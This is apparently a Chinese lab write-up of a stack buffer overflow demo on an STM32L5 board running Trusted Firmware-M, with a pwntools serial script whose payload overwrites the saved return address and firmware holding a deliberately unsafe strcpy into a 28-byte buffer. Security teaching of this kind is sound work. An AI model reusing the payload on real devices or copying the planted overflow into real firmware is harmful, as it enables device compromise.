python脚本为main1.py文件
stm32端代码文件夹为trusted-firmware-m-ROP2

# 一、函数调用规则
----------------------------
ARM cortex-M33架构
[arm_backtrace](http://blog.coderhuo.tech/2017/11/26/arm_backtrace/)

# 二、ROP原理与相关知识
----------------------------
## 常见栈攻击危险操作
- 输入
    - gets，直接读取一行，忽略'\x00'
    - scanf
    - vscanf
- 输出
    - sprintf
- 字符串
    - strcpy，字符串复制，遇到'\x00'停止
    - strcat，字符串拼接，遇到'\x00'停止
    - bcopy

**本次攻击选取strcpy函数实现栈溢出**



# 三、ROP实现
----------------------------
## (一)完整代码及详细注释
### Python端
在windows主机的pycharm上运行即可
涉及到**串口通信**和**payload构造**，后续说明
```python
#!/usr/bin/env python3

from pwn import *
import serial
import serial.tools.list_ports
import time

success_addr = 0x080552D9

def scan_all_ports():
    COM_lst = []
    ports_list  = serial.tools.list_ports.comports()
    if len(ports_list) <= 0:
        print("无串口设备。")
    else:
        print("可用串口设备如下：")
        for comport in ports_list:
            COM_num = list(comport)[0]
            print(COM_num, "   |   ", list(comport)[1])
            COM_lst.append(COM_num)
    return COM_lst



def open_port(COM_num):
    # 打开串口
    # 完整的打开串口的方式
    ser = serial.Serial(port=COM_num,
                        baudrate=115200,#这里的波特率要和stm32端保持一致
                        bytesize=serial.EIGHTBITS,
                        parity=serial.PARITY_NONE,
                        stopbits=serial.STOPBITS_ONE,
                        timeout=1,
                        xonxoff=False,
                        rtscts=False,
                        dsrdtr=False,
                        write_timeout=0.001,
                        inter_byte_timeout=None,
                        exclusive=None)
    if ser.isOpen():                        # 判断串口是否成功打开
        print("打开串口成功 port open success:", ser.name)
    else:
        print("打开串口失败 port open failure")

    return ser



def close_port(ser):
    if ser.isOpen():
        ser.close()
        return True
    else:
        pass

def main_task(ser):
    flag_A_ack = False
    last_time = 0
    count=10
    while(count):
        count=count-1
        if(time.time_ns() - last_time > 1000*1e6):

            if flag_A_ack == True:
                print("ERROR:上一次的命令尚未完成")
                assert 0

            print(payload)
            # write函数的参数要是字节数据，这里构造的payload已经是字节数据了
            num_bytes = ser.write(payload)
            print("发送成功")
            last_time = time.time_ns()
            flag_A_ack = True
            break

    while (True):
        if flag_A_ack:
            rxdata = ser.read(100) # 返回的是bytes对象,bytes只是一个8bit数字为一个单位元素的数组
            rxdata_str = rxdata.decode('utf-8')
            if rxdata:
                print("接收成功,接收内容如下：")
                #print(len(rxdata))
                print(rxdata_str)
                break
            else:
                # 若由于延迟，此次没有接收到数据，会在下一个while循环中继续尝试接收
                print("未接收到有效语句")
                pass



if __name__ == "__main__":

    COM_lst = scan_all_ports()
    #打开串口
    ser = open_port(COM_lst[0])

    # 构造Payload,栈结构可以用vscode+gdb调试来分析
    # 这里的A填充了数组s的存储空间，通过调试可以知道需要28个A（不是因为定义了s[28]就代表需要28个填充字符，不同编译器不一样，建议手动调试确认）
    payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAA'

    # s填充结束后，距离LR寄存器还有4字节的空间（通过调试可知）
    payload += b'bbbb'
    # 这里即是覆盖到LR上的地址
    payload += p32(success_addr)

    main_task(ser)

input("EOF")

```

### stm32端
涉及到**串口通信**和**缓冲区溢出的触发**，后续说明
在`trusted-firmware-m/cmake_build/lib/ext/tfm_test_repo-src/app/main_ns.c`文件改写为以下代码：
```c
/*
 * Copyright (c) 2017-2022, Arm Limited. All rights reserved.
 * Copyright (c) 2022 Cypress Semiconductor Corporation (an Infineon company)
 * or an affiliate of Cypress Semiconductor Corporation. All rights reserved.
 *
 * SPDX-License-Identifier: BSD-3-Clause
 *
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stm32l5xx_hal.h>


#include "tfm_api.h"
#include "cmsis_os2.h"
#include "cmsis_compiler.h"
#include "tfm_ns_interface.h"
#include "tfm_nsid_manager.h"
#include "test_app.h"
#include "tfm_plat_ns.h"
#include "driver/Driver_USART.h"
#include "device_cfg.h"
#ifdef TFM_PARTITION_NS_AGENT_MAILBOX
#include "tfm_multi_core_api.h"
#include "tfm_ns_mailbox.h"
#endif
#include "tfm_log.h"
#include "uart_stdout.h"
#if (CONFIG_TFM_FLOAT_ABI >= 1)
#include "cmsis.h"
#endif

#ifndef HARDWARE_UART_BSP_H_
#define HARDWARE_UART_BSP_H_

#define USARTx                        USART1

#define UARTx_CLK_ENABLE()            __HAL_RCC_USART1_CLK_ENABLE()
#define UARTx_TX_GPIO_CLK_ENABLE()    __HAL_RCC_GPIOA_CLK_ENABLE()
#define UARTx_RX_GPIO_CLK_ENABLE()    __HAL_RCC_GPIOA_CLK_ENABLE()

#define UARTx_TX_PIN_PORT             GPIOA
#define UARTx_RX_PIN_PORT             GPIOA
#define UARTx_TX_PIN                  GPIO_PIN_9
#define UARTx_RX_PIN                  GPIO_PIN_10
#define GPIO_AFx_UARTx                GPIO_AF7_USART1

#define UARTx_IRQn                    USART1_IRQn
#define UARTx_IRQHandler              USART1_IRQHandler

#endif /* HARDWARE_UART_BSP_H_ */ 

uint8_t Send100Data_flag   = 0;
uint8_t Send200Data_flag   = 0;
uint8_t Send123Data_flag   = 0; 

/**
 * \brief Modified table template for user defined SVC functions
 *
 * \details RTX has a weak definition of osRtxUserSVC, which
 *          is overridden here
 */
#if defined(__ARMCC_VERSION)
#if (__ARMCC_VERSION == 6110004)
/* Workaround needed for a bug in Armclang 6.11, more details at:
 * http://www.keil.com/support/docs/4089.htm
 */
__attribute__((section(".gnu.linkonce")))
#endif

/* Avoids the semihosting issue */
#if (__ARMCC_VERSION >= 6010044)
__asm("  .global __ARM_use_no_argv\n");
#endif
#endif

/**
 * \brief List of RTOS thread attributes
 */
static const osThreadAttr_t thread_attr = {
    .name = "test_thread",
    .stack_size = 4096U,
    .tz_module = ((TZ_ModuleId_t)TFM_DEFAULT_NSID)
};
/**
 * \brief Static globals to hold RTOS related quantities,
 *        main thread
 */
static osThreadFunc_t thread_func = test_app;

#ifdef TFM_MULTI_CORE_NS_OS_MAILBOX_THREAD
static osThreadFunc_t mailbox_thread_func = tfm_ns_mailbox_thread_runner;
static const osThreadAttr_t mailbox_thread_attr = {
    .name = "mailbox_thread",
    .stack_size = 1024U
};
#endif

#ifdef TFM_PARTITION_NS_AGENT_MAILBOX
static struct ns_mailbox_queue_t ns_mailbox_queue;

static void tfm_ns_multi_core_boot(void)
{
    int32_t ret;

    LOG_MSG("Non-secure code running on non-secure core.\r\n");

    if (tfm_ns_wait_for_s_cpu_ready()) {
        LOG_MSG("Error sync'ing with secure core.\r\n");

        /* Avoid undefined behavior after multi-core sync-up failed */
        for (;;) {
        }
    }

    ret = tfm_ns_mailbox_init(&ns_mailbox_queue);
    if (ret != MAILBOX_SUCCESS) {
        LOG_MSG("Non-secure mailbox initialization failed.\r\n");

        /* Avoid undefined behavior after NS mailbox initialization failed */
        for (;;) {
        }
    }
}
#endif /* TFM_PARTITION_NS_AGENT_MAILBOX */

#ifdef CONFIG_TFM_USE_TRUSTZONE
extern uint32_t tfm_ns_interface_init(void);
#endif

/**
 * \brief Platform peripherals and devices initialization.
 *        Can be overridden for platform specific initialization.
 *
 * \return  ARM_DRIVER_OK if the initialization succeeds
 */
__WEAK int32_t tfm_ns_platform_init(void)
{
    stdio_init();

    return ARM_DRIVER_OK;
}

/**
 * \brief Platform peripherals and devices de-initialization.
 *        Can be overridden for platform specific initialization.
 *
 * \return  ARM_DRIVER_OK if the de-initialization succeeds
 */
__WEAK int32_t tfm_ns_platform_uninit(void)
{
    stdio_uninit();

    return ARM_DRIVER_OK;
}


__WEAK int32_t tfm_ns_cp_init(void)
{
#if (CONFIG_TFM_FLOAT_ABI >= 1)
#ifdef __GNUC__
    /* Enable NSPE privileged and unprivilged access to the FP Extension */
    SCB->CPACR |= (3U << 10U*2U)     /* enable CP10 full access */
                  | (3U << 11U*2U);  /* enable CP11 full access */
#endif
#endif
    return ARM_DRIVER_OK;
}
UART_HandleTypeDef huart1;
uint8_t pRxData[128];    // 接收数据缓冲区

void vulnerable(){
    char s[28];
    //strcpy函数不会检查pRxdata的长度，当其长度超过s数组的大小，会造成缓冲区溢出
    strcpy(s,pRxData);
    //puts(s);
    return;
}

void success() { 
    // 成功将控制流劫持到success函数之后，会向python端发送信息，便于展示
    puts("Jump to the success function, the attack is successful!!!");
}

void USARTx_init(void)
{
    huart1.Instance                  = USARTx;
    huart1.Init.BaudRate             = 115200;               // 9600 115200 2000000
    huart1.Init.WordLength           = UART_WORDLENGTH_8B;  // USART_WORDLENGTH_8B 或 USART_WORDLENGTH_9B
    huart1.Init.HwFlowCtl            = UART_HWCONTROL_NONE;
    huart1.Init.Mode                 = UART_MODE_TX_RX;     // 收发都需要
    huart1.Init.Parity               = UART_PARITY_NONE;    // 不做奇偶校验，还可以USART_PARITY_EVEN 或 USART_PARITY_ODD
    huart1.Init.StopBits             = UART_STOPBITS_1;     // USART_STOPBITS_0_5 或 USART_STOPBITS_1 或 USART_STOPBITS_1_5 或 USART_STOPBITS_2
    huart1.Init.OverSampling         = UART_OVERSAMPLING_16;

    if (HAL_UART_Init(&huart1) != HAL_OK)
    {
        while(1){}
    }

    ReceiveData(pRxData,36);
    
}


void HAL_UART_MspInit(UART_HandleTypeDef *husart)
{
    // 开启时钟,具体用哪个USAART外设，用哪个GPIO组由宏定义决定
    UARTx_CLK_ENABLE();
    UARTx_TX_GPIO_CLK_ENABLE();
    UARTx_RX_GPIO_CLK_ENABLE();

    // 初始化TX RX GPIO引脚
    // 初始化使用的引脚PA9，PA10
    GPIO_InitTypeDef GPIO_InitStructure;

    GPIO_InitStructure.Mode      = GPIO_MODE_AF_PP; //复用推挽输出
    GPIO_InitStructure.Speed     = GPIO_SPEED_FREQ_VERY_HIGH;
    GPIO_InitStructure.Pull      = GPIO_NOPULL;
    GPIO_InitStructure.Alternate = GPIO_AFx_UARTx; //复用

    GPIO_InitStructure.Pin       = UARTx_TX_PIN;
    HAL_GPIO_Init(UARTx_TX_PIN_PORT, &GPIO_InitStructure);

    GPIO_InitStructure.Pin       = UARTx_RX_PIN;
    HAL_GPIO_Init(UARTx_RX_PIN_PORT, &GPIO_InitStructure);

    // 配置中断优先级
    HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_2);
    HAL_NVIC_SetPriority(UARTx_IRQn, 3, 3);
    HAL_NVIC_EnableIRQ(UARTx_IRQn);
}


// ****************************************************************** //

// 中断函数，函数名UARTx_IRQHandler是UART_BSP.h文件中的宏定义，实际上是USART1_IRQHandler
void UARTx_IRQHandler(void)
{
    HAL_UART_IRQHandler(&huart1);
}


// ****************************************************************** //


// 发送指定字节的数据，其实就是调用HAL_UART_Transmit_IT
void SendData(uint8_t *pTxData, uint16_t Size)
{
    HAL_UART_Transmit_IT(&huart1, pTxData, Size);
}
// 发送完毕后进入发送中断，什么也不用做
void HAL_USART_TxCpltCallback(UART_HandleTypeDef *husart)
{
    // do nothing
}

// ****************************************************************** //


// 接受指定字节的数据，其实就是调用HAL_UART_Receive_IT
void ReceiveData(uint8_t *pRxData, uint16_t Size)
{
    HAL_UART_Receive_IT(&huart1, pRxData, Size);
}

// 中断函数不需要手动调用
// 重点是接收中断回调函数，接受的数据会放在全局变量pRxData中
// main.c文件中定义各个flag要在中断函数中修改，所以必须用extern再声明1次
extern uint8_t Send100Data_flag;
extern uint8_t Send200Data_flag;
extern uint8_t Send123Data_flag;
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *husart)
{
    // 在UART接受中断中，先判断是否有效接收到了payload，即pRxdata的数据是否成功被改写
    //如果成功接受数据
    if(pRxData[0] == 'A'){
        Send100Data_flag = 1;
        ReceiveData(pRxData,36);
        /*栈溢出*/
        vulnerable();
    }//如果没有成功接受，开始下一次接收
    else
    {
        ReceiveData(pRxData,36);
    }
}


uint8_t* GetData(void)
{
    return pRxData;
}



/**
 * \brief main() function
 */
#ifndef __GNUC__
__attribute__((noreturn))
#endif
int main(void)
{
    //串口初始化
    USARTx_init(); 

    if (tfm_ns_platform_init() != ARM_DRIVER_OK) {
        /* Avoid undefined behavior if platform init failed */
        while(1);
    }

    if (tfm_ns_cp_init() != ARM_DRIVER_OK) {
        /* Avoid undefined behavior if co-porcessor init failed */
        while(1);
    }

    (void) osKernelInitialize();

#ifdef TFM_PARTITION_NS_AGENT_MAILBOX
    tfm_ns_multi_core_boot();
#endif

#ifdef CONFIG_TFM_USE_TRUSTZONE
    /* Initialize the TFM NS interface */
    tfm_ns_interface_init();
#endif

#ifdef TFM_MULTI_CORE_NS_OS_MAILBOX_THREAD
    (void) osThreadNew(mailbox_thread_func, NULL, &mailbox_thread_attr);
#endif

    (void) osThreadNew(thread_func, NULL, &thread_attr);

    while(1){
        if (Send100Data_flag){
            // //SendData("stm32,success read",strlen("stm32,success read"));
            // /*栈溢出*/
            // vulnerable();
            break;
        }
    }


    LOG_MSG("Non-Secure system starting...\r\n");
    (void) osKernelStart();
    //在main函数里调用一次success，否则链接的时候可能会识别不到suceess函数
    //这并不会影响攻击的展示，攻击在这之前会完成
    success();

    /* Reached only in case of error */
    for (;;) {
    }
}
```

## （二）complie tfm on wsl ubuntu
见`tfm_stm32l5.md`文件

## （三）use checksec to check binary file's security in Ubuntu
[学习资料来源](https://zhuanlan.zhihu.com/p/584502713)

1. checksec installer
```bash
sudo apt install checksec
```
2. use checksec
```bash
cd cmake_build/bin
checksec --file=./tfm_ns.elf
```
The output is:
![Alt text](image.png)

checksec结果解读：
- Canary（堆栈溢出哨兵）
- PIE：位置无关可执行文件(Position-Independent Executable)（PIE），顾名思义，它指的是放置在内存中某处执行的代码，不管其绝对地址的位置，即代码段、数据段地址随机化（ASLR）
- NX（堆栈禁止执行），NX 代表 不可执行(non-executable)。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。

## （四）use ROPGadget tool to get gadgets
```bash
su jiangzixian
cd ~/ROP/ROPgadget
python3 ROPgadget.py --binary ~/trusted-firmware-m-ROP/cmake_build/bin/tfm_ns.elf | grep pop
```
the output is:
![Alt text](image-11.png)

注：我们这里只是实现了一个缓冲区溢出攻击，并没有实现真正意义上的rop攻击，即没有使用到gedgets

## （五）IDA pro打开tfm_ns.elf
可静态分析elf

## （六）代码运行及结果
1. 先在windows终端打开ST-Link
2. 运行vscode
3. 在pycharm平台运行python脚本
4. 结果如下：
![Alt text](image-12.png)



# 附：pyserial库：python与stm32串口通信
---------------------------------------
注：大部分rop攻击或栈溢出攻击会引用pwntools库，但pwntools库自带的串口通信函数serialtube()在实际应用中有问题，无法有效发送payload。但这里使用pwntools库不就是为了发送一下字节数据payload吗？转用专门的串口通信库pyserial中的write()函数更为合理，本次实验即用pyserial库，亲测有效。步骤如下

1. 下载serial
```bash
pip install pyserial
```
2. 找到端口号
![Alt text](image-7.png)
设备管理器里看即可，这里是COM3

3. python端代码如下：在本机Pycharm运行即可,移植该代码不需要有改动，已实现自动化扫描本机端口号并使用
```python
import serial
import serial.tools.list_ports
import time


def scan_all_ports():
    COM_lst = []
    ports_list  = serial.tools.list_ports.comports()
    if len(ports_list) <= 0:
        print("无串口设备。")
    else:
        print("可用串口设备如下：")
        for comport in ports_list:
            COM_num = list(comport)[0]
            print(COM_num, "   |   ", list(comport)[1])
            COM_lst.append(COM_num)
    return COM_lst



def open_port(COM_num):
    # 打开串口
    # 完整的打开串口的方式
    ser = serial.Serial(port=COM_num,
                        baudrate=115200,
                        bytesize=serial.EIGHTBITS,
                        parity=serial.PARITY_NONE,
                        stopbits=serial.STOPBITS_ONE,
                        timeout=1,       # 1ms timeout在2M波特率下，1ms足够传输2k bit~200 byte，绰绰有余
                        xonxoff=False,
                        rtscts=False,
                        dsrdtr=False,
                        write_timeout=0.001,
                        inter_byte_timeout=None,
                        exclusive=None)
    if ser.isOpen():                        # 判断串口是否成功打开
        print("打开串口成功 port open success:", ser.name)
    else:
        print("打开串口失败 port open failure")

    return ser



def close_port(ser):
    if ser.isOpen():
        ser.close()
        return True
    else:
        pass


def main_task(ser):
    flag_A_ack = False
    last_time = 0
    while(True):
        if(time.time_ns() - last_time > 1000*1e6):

            if flag_A_ack == True:
                print("ERROR:上一次的命令尚未完成")
                assert 0

            num_bytes = ser.write("C".encode('utf-8'))
            last_time = time.time_ns()
            flag_A_ack = True

        if flag_A_ack:
            rxdata = ser.read(6) # 返回的是bytes对象,bytes只是一个8bit数字为一个单位元素的数组
            rxdata_str = rxdata.decode('utf-8')
            if rxdata:
                assert len(rxdata_str) == 6
                flag_A_ack = False # 收到数据并验证后清除flag
                for each in rxdata:
                    assert each == 123
                    print(each," ",end="")
                print("连接成功")
            else:
                # 若由于延迟，此次没有接收到数据，会在下一个while循环中继续尝试接收
                print("连接失败")
                pass



if __name__ == "__main__":

    COM_lst = scan_all_ports()
    ser = open_port(COM_lst[0])
    #ser = open_port(COM3)
    main_task(ser)

input("EOF")
```
4. stm32端代码
在`trusted-firmware-m-ROP/cmake_build/lib/ext/tfm_test_repo-src/app/main_ns.c`文件里加入以下代码即可
```c
#include <stm32l5xx_hal.h>


#ifndef HARDWARE_UART_BSP_H_
#define HARDWARE_UART_BSP_H_

#define USARTx                        USART1

#define UARTx_CLK_ENABLE()            __HAL_RCC_USART1_CLK_ENABLE()
#define UARTx_TX_GPIO_CLK_ENABLE()    __HAL_RCC_GPIOA_CLK_ENABLE()
#define UARTx_RX_GPIO_CLK_ENABLE()    __HAL_RCC_GPIOA_CLK_ENABLE()

#define UARTx_TX_PIN_PORT             GPIOA
#define UARTx_RX_PIN_PORT             GPIOA
#define UARTx_TX_PIN                  GPIO_PIN_9
#define UARTx_RX_PIN                  GPIO_PIN_10
#define GPIO_AFx_UARTx                GPIO_AF7_USART1

#define UARTx_IRQn                    USART1_IRQn
#define UARTx_IRQHandler              USART1_IRQHandler

#endif /* HARDWARE_UART_BSP_H_ */ 

uint8_t Send100Data_flag   = 0;
uint8_t Send200Data_flag   = 0;
uint8_t Send123Data_flag   = 0; 


UART_HandleTypeDef huart1;
uint8_t pRxData[64]={0};    // 接收数据缓冲区

void USARTx_init(void)
{
    huart1.Instance                  = USARTx;
    huart1.Init.BaudRate             = 115200;               // 9600 115200 2000000
    huart1.Init.WordLength           = UART_WORDLENGTH_8B;  // USART_WORDLENGTH_8B 或 USART_WORDLENGTH_9B
    huart1.Init.HwFlowCtl            = UART_HWCONTROL_NONE;
    huart1.Init.Mode                 = UART_MODE_TX_RX;     // 收发都需要
    huart1.Init.Parity               = UART_PARITY_NONE;    // 不做奇偶校验，还可以USART_PARITY_EVEN 或 USART_PARITY_ODD
    huart1.Init.StopBits             = UART_STOPBITS_1;     // USART_STOPBITS_0_5 或 USART_STOPBITS_1 或 USART_STOPBITS_1_5 或 USART_STOPBITS_2
    huart1.Init.OverSampling         = UART_OVERSAMPLING_16;

    if (HAL_UART_Init(&huart1) != HAL_OK)
    {
        while(1){}
    }
    //初始化结束后即开始不停的接收数据，这里是第一次接收
    ReceiveData(pRxData, 1);
}


void HAL_UART_MspInit(UART_HandleTypeDef *husart)
{
    // 开启时钟,具体用哪个USAART外设，用哪个GPIO组由宏定义决定
    UARTx_CLK_ENABLE();
    UARTx_TX_GPIO_CLK_ENABLE();
    UARTx_RX_GPIO_CLK_ENABLE();

    // 初始化TX RX GPIO引脚
    // 初始化使用的引脚PA9，PA10
    GPIO_InitTypeDef GPIO_InitStructure;

    GPIO_InitStructure.Mode      = GPIO_MODE_AF_PP; //复用推挽输出
    GPIO_InitStructure.Speed     = GPIO_SPEED_FREQ_VERY_HIGH;
    GPIO_InitStructure.Pull      = GPIO_NOPULL;
    GPIO_InitStructure.Alternate = GPIO_AFx_UARTx; //复用

    GPIO_InitStructure.Pin       = UARTx_TX_PIN;
    HAL_GPIO_Init(UARTx_TX_PIN_PORT, &GPIO_InitStructure);

    GPIO_InitStructure.Pin       = UARTx_RX_PIN;
    HAL_GPIO_Init(UARTx_RX_PIN_PORT, &GPIO_InitStructure);

    // 配置中断优先级
    HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_2);
    HAL_NVIC_SetPriority(UARTx_IRQn, 3, 3);
    HAL_NVIC_EnableIRQ(UARTx_IRQn);
}




// ****************************************************************** //

// 中断函数，函数名UARTx_IRQHandler是UART_BSP.h文件中的宏定义，实际上是USART1_IRQHandler
void UARTx_IRQHandler(void)
{
    HAL_UART_IRQHandler(&huart1);
}


// ****************************************************************** //


// 发送指定字节的数据，其实就是调用HAL_UART_Transmit_IT
void SendData(uint8_t *pTxData, uint16_t Size)
{
    HAL_UART_Transmit_IT(&huart1, pTxData, Size);
}
// 发送完毕后进入发送中断，什么也不用做
void HAL_USART_TxCpltCallback(UART_HandleTypeDef *husart)
{
    // do nothing
}

// ****************************************************************** //


// 接受指定字节的数据，其实就是调用HAL_UART_Receive_IT
void ReceiveData(uint8_t *pRxData, uint16_t Size)
{
    HAL_UART_Receive_IT(&huart1, pRxData, Size);
}

// 重点是接收中断回调函数，接受的数据会放在全局变量pRxData中
// 在中断回调函数中，根据接收的数据判断之后要执行什么操作，将相应的flag置1
// main.c文件中定义各个flag要在中断函数中修改，所以必须用extern再声明1次
// 表示这些flag就是main.c文件中的同名变量
extern uint8_t Send100Data_flag;
extern uint8_t Send200Data_flag;
extern uint8_t Send123Data_flag;
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *husart)
{
    // 在UART接受中断中，根据收到的字节判断是何种命令，并设置相应的flag
    // 相应的flag将在main函数的while循环中决定完成哪些任务
    // 可以用if else结构或switch结构
    if (pRxData[0] == 'A')
    {
        Send100Data_flag = 1;
        ReceiveData(pRxData, 1);
    }
    else if(pRxData[0] == 'B')
    {
        Send200Data_flag = 1;
        ReceiveData(pRxData, 1);
    }
    else if(pRxData[0] == 'C')
    {
        Send123Data_flag = 1;
        ReceiveData(pRxData, 1);
    }
    else
    {
        ReceiveData(pRxData, 1);
    }
}


uint8_t* GetData(void)
{
    return pRxData;
}



/**
 * \brief main() function
 */
#ifndef __GNUC__
__attribute__((noreturn))
#endif
int main(void)
{
    USARTx_init(); 

    if (tfm_ns_platform_init() != ARM_DRIVER_OK) {
        /* Avoid undefined behavior if platform init failed */
        while(1);
    }

    if (tfm_ns_cp_init() != ARM_DRIVER_OK) {
        /* Avoid undefined behavior if co-porcessor init failed */
        while(1);
    }

    (void) osKernelInitialize();

#ifdef TFM_PARTITION_NS_AGENT_MAILBOX
    tfm_ns_multi_core_boot();
#endif

#ifdef CONFIG_TFM_USE_TRUSTZONE
    /* Initialize the TFM NS interface */
    tfm_ns_interface_init();
#endif

#ifdef TFM_MULTI_CORE_NS_OS_MAILBOX_THREAD
    (void) osThreadNew(mailbox_thread_func, NULL, &mailbox_thread_attr);
#endif

    (void) osThreadNew(thread_func, NULL, &thread_attr);

    while (1)
    {

        if (Send100Data_flag)
        {
            uint8_t  Data[]   = {100,100,100,100,100,100};
            uint16_t Size_d   = 6;
            SendData(Data, Size_d);
            Send100Data_flag  = 0; // 清空该flag
        }

        if (Send200Data_flag)
        {
            uint8_t  Data[]   = {200,200,200,200,200,200};
            uint16_t Size_d   = 6;
            SendData(Data, Size_d);
            Send200Data_flag  = 0;  // 清空该flag
        }

        if (Send123Data_flag)
        {
            uint8_t  Data[]   = {123,123,123,123,123,123};
            uint16_t Size_d   = 6;
            SendData(Data, Size_d);
            Send123Data_flag  = 0;  // 清空该flag
        }
    } 

    /*栈溢出*/
    vulnerable();

    success();

    LOG_MSG("Non-Secure system starting...\r\n");
    (void) osKernelStart();

    /* Reached only in case of error */
    for (;;) {
    }
}
```
5. 在`main_ns.c`文件对应的`CMakeList.txt`中，头文件包含路径添加：
```c
${CMAKE_CURRENT_SOURCE_DIR}/hal/Inc
```
因为`#include <stm32l5xx_hal.h>`在这里

6. 通信结果
![Alt text](image-8.png)
通信不太稳定，待解决

7. 参考资料
[代码借鉴](https://www.bilibili.com/read/cv22209051/?spm_id_from=333.999.0.0)
[配套视频](https://www.bilibili.com/video/BV1WD4y1M73u/?spm_id_from=333.337.search-card.all.click&vd_source=399f81bb84c92d72ec26e6e0140c80b8)

**本实验的代码是基于这些代码进行修改的**

# 附：windows下载pwntools库
----------------------------
```bash
pip install pwntools -i https://pypi.douban.com/simple
```

# 意外的make问题
------------------------------
![Alt text](60d69afd177f30456c651961060441f.png)

CMakeList.txt中加上这个即可
```c
set(CMAKE_AR "/usr/bin/ar")
set(CMAKE_OBJCOPY "/usr/share/gcc-arm-none-eabi-10.3-2021.10/bin/arm-none-eabi-objcopy")
set(TFM_TOOLCHAIN_FILE "toolchain_GNUARM.cmake")
```
![Alt text](image-6.png)

或者改变cmake命令：
```bash
cmake -B cmake_build -DTFM_PLATFORM=stm/stm32l562e_dk -DBL2=OFF -DCMAKE_AR=/usr/bin/ar -DCMAKE_OBJCOPY=/usr/share/gcc-arm-none-eabi-10.3-2021.10/bin/arm-none-eabi-objcopy -DTFM_TOOLCHAIN_FILE=toolchain_GNUARM.cmake
```

# 待解决
-----------------------------

1. 问：脚本payload中'a'是做什么的？

在构造 payload 的过程中，我们使用填充数据来填充溢出部分，以覆盖掉返回地址等。在这个示例中，我们将填充数据设置为一个由字符 A 组成的字节序列。这是一个常见的选择，因为 A 字符在 ASCII 编码中具有固定的表示值。



